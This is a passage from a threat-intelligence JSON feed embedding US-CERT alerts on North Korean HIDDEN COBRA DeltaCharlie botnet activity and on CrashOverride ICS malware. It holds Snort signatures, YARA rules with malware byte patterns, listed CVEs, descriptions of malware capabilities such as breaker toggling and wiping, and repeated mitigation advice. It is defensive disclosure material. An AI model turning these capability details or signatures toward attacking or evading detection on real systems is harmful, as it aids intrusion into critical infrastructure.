control.</li><li><strong>Understand firewalls</strong> – Firewalls provide security to make your network less susceptible to attack. They can be configured to block data and applications from certain locations (IP whitelisting), while allowing relevant and necessary data through.</li></ol><p><strong><em>Response to Unauthorized Network Access</em></strong></p><p><strong>Enforce your security incident response and business continuity plan.</strong> It may take time for your organization’s IT professionals to isolate and remove threats to your systems and restore normal operations. Meanwhile, you should take steps to maintain your organization’s essential functions according to your business continuity plan. Organizations should maintain and regularly test backup plans, disaster recovery plans, and business continuity procedures.</p><p><strong>Contact DHS or your local FBI office immediately.</strong> To report an intrusion and request resources for incident response or technical assistance, you are encouraged to contact DHS NCCIC (NCCICCustomerService@hq.dhs.gov or 888-282-0870), the FBI through a local field office, or the FBI’s Cyber Division (CyWatch@fbi.gov or 855-292-3937).</p><p><strong><em>Protect Against SQL Injection and Other Attacks on Web Services</em></strong></p><p>To protect against code injections and other attacks, system operators should routinely evaluate known and published vulnerabilities, periodically perform software updates and technology refreshes, and audit external-facing systems for known web application vulnerabilities. They should also take the following steps to harden both web applications and the servers hosting them to reduce the risk of network intrusion via this vector.</p><ul><li>Use and configure available firewalls to block attacks.</li><li>Take steps to secure Windows systems, such as installing and configuring Microsoft’s Enhanced Mitigation Experience Toolkit (EMET) and Microsoft AppLocker.</li><li>Monitor and remove any unauthorized code present in any www directories.</li><li>Disable, discontinue, or disallow the use of Internet Control Message Protocol (ICMP) and Simple Network Management Protocol (SNMP) as much as possible.</li><li>Remove unnecessary HTTP verbs from web servers. Typical web servers and applications only require GET, POST, and HEAD.</li><li>Where possible, minimize server fingerprinting by configuring web servers to avoid responding with banners identifying the server software and version number.</li><li>Secure both the operating system and the application.</li><li>Update and patch production servers regularly.</li><li>Disable potentially harmful SQL-stored procedure calls.</li><li>Sanitize and validate input to ensure that it is properly typed and does not contain escaped code.</li><li>Consider using type-safe stored procedures and prepared statements.</li><li>Audit transaction logs regularly for suspicious activity.</li><li>Perform penetration testing on web services.</li><li>Ensure error messages are generic and do not expose too much information.</li></ul><p><strong><em>Permissions, Privileges, and Access Controls</em></strong></p><p>System operators should take the following steps to limit permissions, privileges, and access controls.</p><ul><li>Reduce privileges to only those needed for a user’s duties.</li><li>Restrict users’ ability (permissions) to install and run unwanted software applications, and apply the principle of “Least Privilege” to all systems and services. Restricting these privileges may prevent malware from running or limit its capability to spread through the network.</li><li>Carefully consider the risks before granting administrative rights to users on their own machines.</li><li>Scrub and verify all administrator accounts regularly.</li><li>Configure Group Policy to restrict all users to only one login session, where possible.</li><li>Enforce secure network authentication, where possible.</li><li>Instruct administrators to use non-privileged accounts for standard functions such as web browsing or checking webmail.</li><li>Segment networks into logical enclaves and restrict host-to-host communication paths. Containment provided by enclaving also makes incident cleanup significantly less costly.</li><li>Configure firewalls to disallow Remote Desktop Protocol (RDP) traffic coming from outside of the network boundary, except for in specific configurations such as when tunneled through a secondary virtual private network (VPN) with lower privileges.</li><li>Audit existing firewall rules and close all ports that are not explicitly needed for business. Specifically, carefully consider which ports should be connecting outbound versus inbound.</li><li>Enforce a strict lockout policy for network users and closely monitor logs for failed login activity. Failed login activity can be indicative of failed intrusion activity.</li><li>If remote access between zones is an unavoidable business need, log and monitor these connections closely.</li><li>In environments with a high risk of interception or intrusion, organizations should consider supplementing password authentication with other forms of authentication such as challenge/response or multifactor authentication using biometric or physical tokens.</li></ul><p><strong><em>Logging Practices</em></strong></p><p>System operators should follow these secure logging practices.</p><ul><li>Ensure event logging, including applications, events, login activities, and security attributes, is turned on or monitored for identification of security issues.</li><li>Configure network logs to provide adequate information to assist in quickly developing an accurate determination of a security incident.</li><li>Upgrade PowerShell to new versions with enhanced logging features and monitor the logs to detect usage of PowerShell commands, which are often malware-related.</li><li>Secure logs in a centralized location and protect them from modification.</li><li>Prepare an incident response plan that can be rapidly administered in case of a cyber intrusion.</li></ul>\t\t    \n\t\t    <h3>References</h3>\n\t\t    <ul>\n            \t\t    \t<li><a href=\"https://exchange.xforce.ibmcloud.com/collection/Actor-Lazarus-Group-0bf5e50d24445f94d6b2d744dc6c63a2\">[1] IBM. Actor Lazarus Group – Blog Post by IBM X-Force Exchange.</a></li>\n            \t\t    \t<li><a href=\"https://www.alienvault.com/blogs/labs-research/operation-blockbuster-unveils-the-actors-behind-the-sony-attacks\">[2] AlienVault. Operation Blockbuster Unveils the Actors Behind the Sony Attacks.</a></li>\n            \t\t    \t<li><a href=\"https://www.symantec.com/connect/blogs/destover-destructive-malware-has-links-attacks-south-korea\">[3] Symantec. Destover: Destructive Malware has links back to attacks on South Korea.</a></li>\n            \t\t    \t<li><a href=\"https://www.symantec.com/connect/blogs/duuzer-back-door-trojan-targets-south-korea-take-over-computers\">[4] Symantec. Duuzer back door Trojan targets South Korea to take over computers.</a></li>\n            \t\t    \t<li><a href=\"https://www.fireeye.com/blog/threat-research/2015/09/zero-day_hwp_exploit.html\">[5] FireEye. Zero-Day HWP Exploit.</a></li>\n            \t\t    \t<li><a href=\"https://www.us-cert.gov/ncas/alerts/TA14-353A\">[6] US-CERT. Alert (TA14-353A) Targeted Destructive Malware. Original Release Date: 12/19/2014 | Last revised: 9/30/2016</a></li>\n            \t\t    \t<li><a href=\"https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\">[7] Novetta. Operation Blockbuster Destructive Malware Report.</a></li>\n            \t\t    </ul>\n\t\t    \n\t\t    <h3>Revision History</h3>\n\t\t    <ul>\n\t\t    \t\t    \t<li>June 13, 2017: Initial Release</li>\n\t\t    \t\t\t    \t<li>August 23, 2017: Updated YARA Rules and included MAR-10132963 (.pdf and .stix files)</li>\n\t\t    \t\t\t    </ul>\n\t\t    <hr />\n\t\t    <p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t    <br />",
			"external_references": [
				{
					"external_id": "9044 at https://www.us-cert.gov",
					"url": "https://www.us-cert.gov/ncas/alerts/TA17-164A",
					"source_name": "open source",
					"description": "Original release date: June 13, 2017 | Last revised: August 23, 2017<br />\n\t\t    <h3>Systems Affected</h3>\n\t\t    <p>Networked Systems</p>\t\t    \n\t\t    <h3>Overview</h3>\n\t\t    <p>This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). This alert provides technical details on the tools and infrastructure used by cyber actors of the North Korean government to target the media, aerospace, financial, and critical infrastructure sectors in the United States and globally. Working with U.S. Government partners, DHS and FBI identified Internet Protocol (IP) addresses associated with a malware variant, known as DeltaCharlie, used to manage North Korea’s distributed denial-of-service (DDoS) botnet infrastructure. This alert contains indicators of compromise (IOCs), malware descriptions, network signatures, and host-based rules to help network defenders detect activity conducted by the North Korean government. The U.S. Government refers to the malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information related to HIDDEN COBRA activity, go to <a href=\"https://www.us-cert.gov/hiddencobra\">https://www.us-cert.gov/hiddencobra</a>.</p><p>If users or administrators detect the custom tools indicative of HIDDEN COBRA, these tools should be immediately flagged, reported to the DHS National Cybersecurity Communications and Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and given highest priority for enhanced mitigation. This alert identifies IP addresses linked to systems infected with DeltaCharlie malware and provides descriptions of the malware and associated malware signatures. DHS and FBI are distributing these IP addresses to enable network defense activities and reduce exposure to the DDoS command-and-control network. FBI has high confidence that HIDDEN COBRA actors are using the IP addresses for further network exploitation.</p><p>This alert includes technical indicators related to specific North Korean government cyber operations and provides suggested response actions to those indicators, recommended mitigation techniques, and information on reporting incidents to the U.S. Government.</p><p>For a downloadable copy of IOCs, see:</p><ul><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-164A_csv.csv\">.csv</a>)</li><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-164A_stix.xml\">.stix</a>)</li></ul><p>On August 23, 2017, DHS published a Malware Analysis Report (MAR-10132963) that examines malware functionality to provide detailed code analysis and insight into specific tactics, techniques, and procedures (TTPs) observed in the malware.</p><p>For a downloadable copy of the MAR, see:</p><ul><li>MAR (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10132963.pdf\">.pdf</a>)</li><li>MAR IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10132963_stix.xml\">.stix</a>)</li></ul>\t\t    \n\t\t    <h3>Description</h3>\n\t\t    <p>Since 2009, HIDDEN COBRA actors have leveraged their capabilities to target and compromise a range of victims; some intrusions have resulted in the exfiltration of data while others have been disruptive in nature. Commercial reporting has referred to this activity as Lazarus Group<a href=\"https://exchange.xforce.ibmcloud.com/collection/Actor-Lazarus-Group-0bf5e50d24445f94d6b2d744dc6c63a2\">[1]</a> and Guardians of Peace.<a href=\"https://www.alienvault.com/blogs/labs-research/operation-blockbuster-unveils-the-actors-behind-the-sony-attacks\">[2]</a> DHS and FBI assess that HIDDEN COBRA actors will continue to use cyber operations to advance their government’s military and strategic objectives. Cyber analysts are encouraged to review the information provided in this alert to detect signs of malicious network activity.</p><p>Tools and capabilities used by HIDDEN COBRA actors include DDoS botnets, keyloggers, remote access tools (RATs), and wiper malware. Variants of malware and tools used by HIDDEN COBRA actors include Destover,<a href=\"https://www.symantec.com/connect/blogs/destover-destructive-malware-has-links-attacks-south-korea\">[3]</a> Wild Positron/Duuzer,<a href=\"https://www.symantec.com/connect/blogs/duuzer-back-door-trojan-targets-south-korea-take-over-computers\">[4]</a> and Hangman.<a href=\"https://www.fireeye.com/blog/threat-research/2015/09/zero-day_hwp_exploit.html\">[5]</a> DHS has previously released Alert TA14-353A,<a href=\"https://www.us-cert.gov/ncas/alerts/TA14-353A\">[6]</a> which contains additional details on the use of a server message block (SMB) worm tool employed by these actors. Further research is needed to understand the full breadth of this group’s cyber capabilities. In particular, DHS recommends that more research should be conducted on the North Korean cyber activity that has been reported by cybersecurity and threat research firms.</p><p>HIDDEN COBRA actors commonly target systems running older, unsupported versions of Microsoft operating systems. The multiple vulnerabilities in these older systems provide cyber actors many targets for exploitation. These actors have also used Adobe Flash player vulnerabilities to gain initial entry into users’ environments.</p><p>HIDDEN COBRA is known to use vulnerabilities affecting various applications. These vulnerabilities include:</p><ul><li>CVE-2015-6585: Hangul Word Processor Vulnerability</li><li>CVE-2015-8651: Adobe Flash Player 18.0.0.324 and 19.x Vulnerability</li><li>CVE-2016-0034: Microsoft Silverlight 5.1.41212.0 Vulnerability</li><li>CVE-2016-1019: Adobe Flash Player 21.0.0.197 Vulnerability</li><li>CVE-2016-4117: Adobe Flash Player 21.0.0.226 Vulnerability</li></ul><p>DHS recommends that organizations upgrade these applications to the latest version and patch level. If Adobe Flash or Microsoft Silverlight is no longer required, DHS recommends that those applications be removed from systems.</p><p>The IOCs provided with this alert include IP addresses determined to be part of the HIDDEN COBRA botnet infrastructure, identified as DeltaCharlie. The DeltaCharlie DDoS bot was originally reported by Novetta in their 2016 Operation Blockbuster Malware Report.<a href=\"https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\">[7]</a> This malware has used the IP addresses identified in the accompanying .csv and .stix files as both source and destination IPs. In some instances, the malware may have been present on victims’ networks for a significant period.</p><p><strong><em>Technical Details</em></strong></p><p>DeltaCharlie is a DDoS tool used by HIDDEN COBRA actors, and is referenced and detailed in Novetta’s Operation Blockbuster Destructive Malware report. The information related to DeltaCharlie from the Operation Blockbuster Destructive Malware report should be viewed in conjunction with the IP addresses listed in the .csv and .stix files provided within this alert. DeltaCharlie is a DDoS tool capable of launching Domain Name System (DNS) attacks, Network Time Protocol (NTP) attacks, and Carrier Grade NAT (CGN) attacks. The malware operates on victims’ systems as a svchost-based service and is capable of downloading executables, changing its own configuration, updating its own binaries, terminating its own processes, and activating and terminating denial-of-service attacks. Further details on the malware can be found in Novetta’s report available at the following URL:</p><p><a href=\"https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\">https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf</a></p><p><strong><em>Detection and Response</em></strong></p><p>HIDDEN COBRA IOCs related to DeltaCharlie are provided within the accompanying .csv and .stix files of this alert. DHS and FBI recommend that network administrators review the IP addresses, file hashes, network signatures, and YARA rules provided, and add the IPs to their watchlist to determine whether malicious activity has been observed within their organization.</p><p>When reviewing network perimeter logs for the IP addresses, organizations may find numerous instances of these IP addresses attempting to connect to their systems. Upon reviewing the traffic from these IP addresses, system owners may find that some traffic corresponds to malicious activity and some to legitimate activity. System owners are also advised to run the YARA tool on any system they suspect to have been targeted by HIDDEN COBRA actors. Additionally, the appendices of this report provide network signatures to aid in the detection and mitigation of HIDDEN COBRA activity.</p><p><strong><em>Network Signatures and Host-Based Rules</em></strong></p><p>This section contains network signatures and host-based rules that can be used to detect malicious activity associated with HIDDEN COBRA actors. Although created using a comprehensive vetting process, the possibility of false positives always remains. These signatures and rules should be used to supplement analysis and should not be used as a sole source of attributing this activity to HIDDEN COBRA actors.</p><p><strong><em>Network Signatures</em></strong></p><p>alert tcp any any -&gt; any any (msg:\"DPRK_HIDDEN_COBRA_DDoS_HANDSHAKE_SUCCESS\"; dsize:6; flow:established,to_server; content:\"|18 17 e9 e9 e9 e9|\"; fast_pattern:only; sid:1; rev:1;)</p><p>________________________________________________________________</p><p>alert tcp any any -&gt; any any (msg:\"DPRK_HIDDEN_COBRA_Botnet_C2_Host_Beacon\"; flow:established,to_server; content:\"|1b 17 e9 e9 e9 e9|\"; depth:6; fast_pattern; sid:1; rev:1;)</p><p>________________________________________________________________</p><p><strong><em>YARA Rules</em></strong></p><p>{</p><p>meta:</p><p>description = “RSA Key”</p><p>strings:</p><p>$rsaKey = {7B 4E 1E A7 E9 3F 36 4C DE F4 F0 99 C4 D9 B7 94</p><p>A1 FF F2 97 D3 91 13 9D C0 12 02 E4 4C BB 6C 77</p><p>48 EE 6F 4B 9B 53 60 98 45 A5 28 65 8A 0B F8 39</p><p>73 D7 1A 44 13 B3 6A BB 61 44 AF 31 47 E7 87 C2</p><p>AE 7A A7 2C 3A D9 5C 2E 42 1A A6 78 FE 2C AD ED</p><p>39 3F FA D0 AD 3D D9 C5 3D 28 EF 3D 67 B1 E0 68</p><p>3F 58 A0 19 27 CC 27 C9 E8 D8 1E 7E EE 91 DD 13</p><p>B3 47 EF 57 1A CA FF 9A 60 E0 64 08 AA E2 92 D0}</p><p>condition:</p><p>any of them</p><p>}</p><p>________________________________________________________________</p><p>{</p><p>meta:</p><p>description = “DDoS Misspelled Strings”</p><p>strings:</p><p>$STR1 = \"Wating\" wide ascii</p><p>$STR2 = \"Reamin\" wide ascii</p><p>$STR3 = \"laptos\" wide ascii</p><p>condition:</p><p>(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and 2 of them</p><p>}</p><p>________________________________________________________________</p><p>{</p><p>meta:</p><p>description = “DDoS Random URL Builder”</p><p>strings:</p><p>$randomUrlBuilder = { 83 EC 48 53 55 56 57 8B 3D ?? ?? ?? ?? 33 C0 C7 44 24 28 B4 6F 41 00 C7 44 24 2C B0 6F 41 00 C7 44 24 30 AC 6F 41 00 C7 44 24 34 A8 6F 41 00 C7 44 24 38 A4 6F 41 00 C7 44 24 3C A0 6F 41 00 C7 44 24 40 9C 6F 41 00 C7 44 24 44 94 6F 41 00 C7 44 24 48 8C 6F 41 00 C7 44 24 4C 88 6F 41 00 C7 44 24 50 80 6F 41 00 89 44 24 54 C7 44 24 10 7C 6F 41 00 C7 44 24 14 78 6F 41 00 C7 44 24 18 74 6F 41 00 C7 44 24 1C 70 6F 41 00 C7 44 24 20 6C 6F 41 00 89 44 24 24 FF D7 99 B9 0B 00 00 00 F7 F9 8B 74 94 28 BA 9C 6F 41 00 66 8B 06 66 3B 02 74 34 8B FE 83 C9 FF 33 C0 8B 54 24 60 F2 AE 8B 6C 24 5C A1 ?? ?? ?? ?? F7 D1 49 89 45 00 8B FE 33 C0 8D 5C 11 05 83 C9 FF 03 DD F2 AE F7 D1 49 8B FE 8B D1 EB 78 FF D7 99 B9 05 00 00 00 8B 6C 24 5C F7 F9 83 C9 FF 33 C0 8B 74 94 10 8B 54 24 60 8B FE F2 AE F7 D1 49 BF 60 6F 41 00 8B D9 83 C9 FF F2 AE F7 D1 8B C2 49 03 C3 8B FE 8D 5C 01 05 8B 0D ?? ?? ?? ?? 89 4D 00 83 C9 FF 33 C0 03 DD F2 AE F7 D1 49 8D 7C 2A 05 8B D1 C1 E9 02 F3 A5 8B CA 83 E1 03 F3 A4 BF 60 6F 41 00 83 C9 FF F2 AE F7 D1 49 BE 60 6F 41 00 8B D1 8B FE 83 C9 FF 33 C0 F2 AE F7 D1 49 8B FB 2B F9 8B CA 8B C1 C1 E9 02 F3 A5 8B C8 83 E1 03 F3 A4 8B 7C 24 60 8D 75 04 57 56 E8 ?? ?? ?? ?? 83 C4 08 C6 04 3E 2E 8B C5 C6 03 00 5F 5E 5D 5B 83 C4 48 C3 }</p><p>condition:</p><p>$randomUrlBuilder</p><div><div id=\"ftn1\"><div><div id=\"ftn1\"><p>}</p><p>________________________________________________________________</p></div><div id=\"ftn2\"> </div></div></div></div>\t\t    \n\t\t    <h3>Impact</h3>\n\t\t    <p>A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include:</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.</li></ul>\t\t    \n\t\t    <h3>Solution</h3>\n\t\t    <p><strong><em>Mitigation Strategies</em></strong></p><p>Network administrators are encouraged to apply the following recommendations, which can prevent as many as 85 percent of targeted cyber intrusions. The mitigation strategies provided may seem like common sense. However, many organizations fail to use these basic security measures, leaving their systems open to compromise:</p><ol><li><strong>Patch applications and operating systems</strong> – Most attackers target vulnerable applications and operating systems. Ensuring that applications and operating systems are patched with the latest updates greatly reduces the number of exploitable entry points available to an attacker. Use best practices when updating software and patches by only downloading updates from authenticated vendor sites.</li><li><strong>Use application whitelisting</strong> – Whitelisting is one of the best security strategies because it allows only specified programs to run while blocking all others, including malicious software.</li><li><strong>Restrict administrative privileges</strong> – Threat actors are increasingly focused on gaining control of legitimate credentials, especially credentials associated with highly privileged accounts. Reduce privileges to only those needed for a user’s duties. Separate administrators into privilege tiers with limited access to other tiers.</li><li><strong>Segment networks and segregate them into security zones</strong> – Segment networks into logical enclaves and restrict host-to-host communications paths. This helps protect sensitive information and critical services, and limits damage from network perimeter breaches.</li><li><strong>Validate input</strong> – Input validation is a method of sanitizing untrusted input provided by users of a web application. Implementing input validation can protect against the security flaws of web applications by significantly reducing the probability of successful exploitation. Types of attacks possibly averted include Structured Query Language (SQL) injection, cross-site scripting, and command injection.</li><li><strong>Use stringent file reputation settings</strong> – Tune the file reputation systems of your anti-virus software to the most aggressive setting possible. Some anti-virus products can limit execution to only the highest reputation files, stopping a wide range of untrustworthy code from gaining control.</li><li><strong>Understand firewalls</strong> – Firewalls provide security to make your network less susceptible to attack. They can be configured to block data and applications from certain locations (IP whitelisting), while allowing relevant and necessary data through.</li></ol><p><strong><em>Response to Unauthorized Network Access</em></strong></p><p><strong>Enforce your security incident response and business continuity plan.</strong> It may take time for your organization’s IT professionals to isolate and remove threats to your systems and restore normal operations. Meanwhile, you should take steps to maintain your organization’s essential functions according to your business continuity plan. Organizations should maintain and regularly test backup plans, disaster recovery plans, and business continuity procedures.</p><p><strong>Contact DHS or your local FBI office immediately.</strong> To report an intrusion and request resources for incident response or technical assistance, you are encouraged to contact DHS NCCIC (NCCICCustomerService@hq.dhs.gov or 888-282-0870), the FBI through a local field office, or the FBI’s Cyber Division (CyWatch@fbi.gov or 855-292-3937).</p><p><strong><em>Protect Against SQL Injection and Other Attacks on Web Services</em></strong></p><p>To protect against code injections and other attacks, system operators should routinely evaluate known and published vulnerabilities, periodically perform software updates and technology refreshes, and audit external-facing systems for known web application vulnerabilities. They should also take the following steps to harden both web applications and the servers hosting them to reduce the risk of network intrusion via this vector.</p><ul><li>Use and configure available firewalls to block attacks.</li><li>Take steps to secure Windows systems, such as installing and configuring Microsoft’s Enhanced Mitigation Experience Toolkit (EMET) and Microsoft AppLocker.</li><li>Monitor and remove any unauthorized code present in any www directories.</li><li>Disable, discontinue, or disallow the use of Internet Control Message Protocol (ICMP) and Simple Network Management Protocol (SNMP) as much as possible.</li><li>Remove unnecessary HTTP verbs from web servers. Typical web servers and applications only require GET, POST, and HEAD.</li><li>Where possible, minimize server fingerprinting by configuring web servers to avoid responding with banners identifying the server software and version number.</li><li>Secure both the operating system and the application.</li><li>Update and patch production servers regularly.</li><li>Disable potentially harmful SQL-stored procedure calls.</li><li>Sanitize and validate input to ensure that it is properly typed and does not contain escaped code.</li><li>Consider using type-safe stored procedures and prepared statements.</li><li>Audit transaction logs regularly for suspicious activity.</li><li>Perform penetration testing on web services.</li><li>Ensure error messages are generic and do not expose too much information.</li></ul><p><strong><em>Permissions, Privileges, and Access Controls</em></strong></p><p>System operators should take the following steps to limit permissions, privileges, and access controls.</p><ul><li>Reduce privileges to only those needed for a user’s duties.</li><li>Restrict users’ ability (permissions) to install and run unwanted software applications, and apply the principle of “Least Privilege” to all systems and services. Restricting these privileges may prevent malware from running or limit its capability to spread through the network.</li><li>Carefully consider the risks before granting administrative rights to users on their own machines.</li><li>Scrub and verify all administrator accounts regularly.</li><li>Configure Group Policy to restrict all users to only one login session, where possible.</li><li>Enforce secure network authentication, where possible.</li><li>Instruct administrators to use non-privileged accounts for standard functions such as web browsing or checking webmail.</li><li>Segment networks into logical enclaves and restrict host-to-host communication paths. Containment provided by enclaving also makes incident cleanup significantly less costly.</li><li>Configure firewalls to disallow Remote Desktop Protocol (RDP) traffic coming from outside of the network boundary, except for in specific configurations such as when tunneled through a secondary virtual private network (VPN) with lower privileges.</li><li>Audit existing firewall rules and close all ports that are not explicitly needed for business. Specifically, carefully consider which ports should be connecting outbound versus inbound.</li><li>Enforce a strict lockout policy for network users and closely monitor logs for failed login activity. Failed login activity can be indicative of failed intrusion activity.</li><li>If remote access between zones is an unavoidable business need, log and monitor these connections closely.</li><li>In environments with a high risk of interception or intrusion, organizations should consider supplementing password authentication with other forms of authentication such as challenge/response or multifactor authentication using biometric or physical tokens.</li></ul><p><strong><em>Logging Practices</em></strong></p><p>System operators should follow these secure logging practices.</p><ul><li>Ensure event logging, including applications, events, login activities, and security attributes, is turned on or monitored for identification of security issues.</li><li>Configure network logs to provide adequate information to assist in quickly developing an accurate determination of a security incident.</li><li>Upgrade PowerShell to new versions with enhanced logging features and monitor the logs to detect usage of PowerShell commands, which are often malware-related.</li><li>Secure logs in a centralized location and protect them from modification.</li><li>Prepare an incident response plan that can be rapidly administered in case of a cyber intrusion.</li></ul>\t\t    \n\t\t    <h3>References</h3>\n\t\t    <ul>\n            \t\t    \t<li><a href=\"https://exchange.xforce.ibmcloud.com/collection/Actor-Lazarus-Group-0bf5e50d24445f94d6b2d744dc6c63a2\">[1] IBM. Actor Lazarus Group – Blog Post by IBM X-Force Exchange.</a></li>\n            \t\t    \t<li><a href=\"https://www.alienvault.com/blogs/labs-research/operation-blockbuster-unveils-the-actors-behind-the-sony-attacks\">[2] AlienVault. Operation Blockbuster Unveils the Actors Behind the Sony Attacks.</a></li>\n            \t\t    \t<li><a href=\"https://www.symantec.com/connect/blogs/destover-destructive-malware-has-links-attacks-south-korea\">[3] Symantec. Destover: Destructive Malware has links back to attacks on South Korea.</a></li>\n            \t\t    \t<li><a href=\"https://www.symantec.com/connect/blogs/duuzer-back-door-trojan-targets-south-korea-take-over-computers\">[4] Symantec. Duuzer back door Trojan targets South Korea to take over computers.</a></li>\n            \t\t    \t<li><a href=\"https://www.fireeye.com/blog/threat-research/2015/09/zero-day_hwp_exploit.html\">[5] FireEye. Zero-Day HWP Exploit.</a></li>\n            \t\t    \t<li><a href=\"https://www.us-cert.gov/ncas/alerts/TA14-353A\">[6] US-CERT. Alert (TA14-353A) Targeted Destructive Malware. Original Release Date: 12/19/2014 | Last revised: 9/30/2016</a></li>\n            \t\t    \t<li><a href=\"https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\">[7] Novetta. Operation Blockbuster Destructive Malware Report.</a></li>\n            \t\t    </ul>\n\t\t    \n\t\t    <h3>Revision History</h3>\n\t\t    <ul>\n\t\t    \t\t    \t<li>June 13, 2017: Initial Release</li>\n\t\t    \t\t\t    \t<li>August 23, 2017: Updated YARA Rules and included MAR-10132963 (.pdf and .stix files)</li>\n\t\t    \t\t\t    </ul>\n\t\t    <hr />\n\t\t    <p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t    <br />"
				}
			],
			"created_by_ref": "US-CERT",
			"created": "2017-06-13T15:45:09.000Z"
		},
		{
			"type": "report",
			"title": "TA17-163A: CrashOverride Malware",
			"name": "TA17-163A: CrashOverride Malware",
			"id": "report--5abcecd7-ce21-4990-9fda-8b9afddc3990",
			"description": "Original release date: June 12, 2017 | Last revised: July 27, 2017<br />\n\t\t    <h3>Systems Affected</h3>\n\t\t    <p>Industrial Control Systems</p>\t\t    \n\t\t    <h3>Overview</h3>\n\t\t    <p>The National Cybersecurity and Communications Integration Center (NCCIC) is aware of public reports from ESET and Dragos outlining a new, highly capable Industrial Controls Systems (ICS) attack platform that was reportedly used in 2016 against critical infrastructure in Ukraine. As reported by <a href=\"https://www.welivesecurity.com/wp-content/uploads/2017/06/Win32_Industroyer.pdf\">ESET</a> and <a href=\"https://www.dragos.com/blog/crashoverride/\">Dragos</a>, the CrashOverride malware is an extensible platform that could be used to target critical infrastructure sectors. NCCIC is working with its partners to validate the ESET and Dragos analysis, and develop a better understanding of the risk this new malware poses to U.S. critical infrastructure.</p><p>Although this activity is still under investigation, NCCIC is sharing this report to provide organizations with detection and mitigation recommendations to help prevent future compromises within their critical infrastructure networks. NCCIC continues to work with interagency and international partners on this activity and will provide updates as information becomes available.</p><p>For a downloadable copy of indicators of compromise (IOCs), see:</p><ul><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-163A_IOCs.csv\">.csv</a>)</li><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-163A_IOCs.stix.XML\">.stix</a>)</li></ul><p>To report activity related to this Alert, please contact NCCIC at <a href=\"https://www.us-cert.govmailto:NCCICCustomerService@hq.dhs.gov\">NCCICCustomerService@hq.dhs.gov</a> or 1-888-282-0870.</p><h4>Risk Evaluation</h4><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\"><tbody><tr><td>NCCIC Cyber Incident Scoring System (NCISS) Rating Priority Level (Color)</td></tr><tr><td>Yellow (Medium)</td></tr><tr><td>A medium priority incident may affect public health or safety, national security, economic security, foreign relations, civil liberties, or public confidence.</td></tr></tbody></table><h4>Details</h4><p>There is no evidence to suggest this malware has affected U.S. critical infrastructure. However, the tactics, techniques, and procedures (TTPs) described as part of the CrashOverride malware could be modified to target U.S. critical information networks and systems.</p>\t\t    \n\t\t    <h3>Description</h3>\n\t\t    <h4>Technical Analysis</h4><p>CrashOverride malware represents a scalable, capable platform. The modules and capabilities publically reported appear to focus on organizations using ICS protocols IEC101, IEC104, and IEC61850, which are more commonly used outside the United States in electric power control systems. The platform fundamentally abuses the functionality of a targeted ICS system’s legitimate control system to achieve its intended effect. While the known capabilities do not appear to be U.S.-focused, it is important to recognize that the general TTPs used in CrashOverride could be leveraged with modified technical implementations to affect U.S.-based critical infrastructure. With further modification, CrashOverride or similar malware could have implications beyond electric power so all critical infrastructure organizations should be evaluating their systems to susceptibilities in the TTPs outlined. The malware has several reported capabilities:</p><ol><li>Issues valid commands directly to remote terminal units (RTUs) over ICS protocols. As reported by Dragos, one such command sequence toggles circuit breakers in a rapid open-close-open-close pattern. This could create conditions where individual utilities may island from infected parties, potentially resulting in a degradation of grid reliability.</li><li>Denies service to local serial COM ports on windows devices, therefore preventing legitimate communications with field equipment over serial from the affected device.</li><li>Scans and maps ICS environment using a variety of protocols, including Open Platform Communications (OPC). This significantly improves the payload’s probability of success.</li><li>Could exploit Siemens relay denial-of-service (DoS) vulnerability, leading to a shutdown of the relay. In this instance, the relay would need to be manually reset to restore functionality.</li><li>Includes a wiper module in the platform that renders windows systems inert, requiring a rebuild or backup restoration.</li></ol><h4>Detection</h4><p>As CrashOverride is a second stage malware capability and has the ability to operate independent of initial C2, traditional methods of detection may not be sufficient to detect infections prior to the malware executing. As a result, organizations are encouraged to implement behavioral analysis techniques to attempt to identify precursor activity to CrashOverride. As additional information becomes available on stage one infection vectors and TTPs, this alert will be updated.</p><p>NCCIC is providing a compilation of IOCs (see links above) from a variety of sources to aid in the detection of this malware. The sources provided do not constitute an exhaustive list and the U.S. Government does not endorse or support any particular product or vendor’s information referenced in this report. However, NCCIC has included this data to ensure wide distribution of the most comprehensive information available and will provide updates as warranted.</p><h5>Signatures</h5><p><code>import “pe”<br />import “hash”</code></p><p><code>rule dragos_crashoverride_exporting_dlls<br />{<br />meta:<br />description = “CRASHOVERRIDE v1 Suspicious Export”<br />author = “Dragos Inc”<br />condition:<br />pe.exports(“Crash”) &amp; pe.characteristics<br />}</code></p><p><code>rule dragos_crashoverride_suspcious<br />{<br />meta:<br />description = “CRASHOVERRIDE v1 Wiper”<br />author = “Dragos Inc”<br 